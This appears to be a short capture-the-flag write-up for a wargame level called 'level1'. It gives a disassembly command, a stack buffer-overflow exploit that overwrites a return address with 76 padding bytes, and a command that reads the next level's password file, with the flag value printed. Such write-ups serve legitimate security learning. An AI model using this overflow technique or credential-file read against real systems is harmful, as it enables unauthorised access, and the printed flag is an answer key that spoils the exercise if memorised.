# level1

## disassemble

```shell
# objdump --disassemble --demangle --disassembler-options intel bonus0
objdump -dC -M intel level1
```

## exploit

```shell
python2.7 -c 'print("B"*76 + "\x44\x84\x04\x08")' > /tmp/exploit.txt
cat /tmp/exploit.txt /dev/stdin | ./level1
```

## flag

```shell
cat /home/user/level2/.pass
53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
```
